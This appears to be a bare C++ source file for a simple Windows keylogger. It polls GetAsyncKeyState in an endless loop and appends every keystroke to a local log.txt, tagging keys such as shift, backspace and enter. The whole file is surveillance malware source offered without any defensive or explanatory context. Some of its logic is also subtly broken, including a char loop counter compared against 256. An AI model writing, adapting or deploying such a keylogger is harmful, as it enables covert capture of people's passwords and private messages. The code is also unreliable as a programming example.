#include <windows.h>
#include <string>
#include <iostream>

using namespace std;


int Save(int key, char *d);

int main()
{
	char file1[8] = "log.txt";
	while (true) {
		for (char i = 8; i < 256; i++)
		{
			if (GetAsyncKeyState(i) == -32767) Save(i, file1);
		}
	}
	return 0;
}

int Save(int key, char *d)
{
	cout << key << endl;
	FILE* OUTPUT;
	OUTPUT = fopen(d, "a+");
	if (key == VK_SHIFT)  fprintf(OUTPUT, "%s", "[SH]");
	else if (key == VK_BACK) fprintf(OUTPUT, "%s", "[del]");
	else if (key == VK_RETURN) fprintf(OUTPUT, "%s", "[enter]");
	else if (key == VK_ESCAPE) fprintf(OUTPUT, "%s", "[esc]");
	else if (key == VK_SPACE) fprintf(OUTPUT, "%s", "[spc]");
	else if (key == VK_NUMPAD0) fprintf(OUTPUT, "%s", "0");
	else if (key == VK_NUMPAD1) fprintf(OUTPUT, "%s", "1");
	else if (key == VK_NUMPAD2) fprintf(OUTPUT, "%s", "2");
	else if (key == VK_NUMPAD3) fprintf(OUTPUT, "%s", "3");
	else if (key == VK_NUMPAD4) fprintf(OUTPUT, "%s", "4");
	else if (key == VK_NUMPAD5) fprintf(OUTPUT, "%s", "5");
	else if (key == VK_NUMPAD6) fprintf(OUTPUT, "%s", "6");
	else if (key == VK_NUMPAD7) fprintf(OUTPUT, "%s", "7");
	else if (key == VK_NUMPAD8) fprintf(OUTPUT, "%s", "8");
	else if (key == VK_NUMPAD9) fprintf(OUTPUT, "%s", "9");
	else if (key == VK_MULTIPLY) fprintf(OUTPUT, "%s", "*");
	else if (key == VK_ADD) fprintf(OUTPUT, "%s", "+"); 
	else if (key == VK_SUBTRACT) fprintf(OUTPUT, "%s", "-");
	else fprintf(OUTPUT, "%s", &key);
	fclose(OUTPUT);
	return 0;
}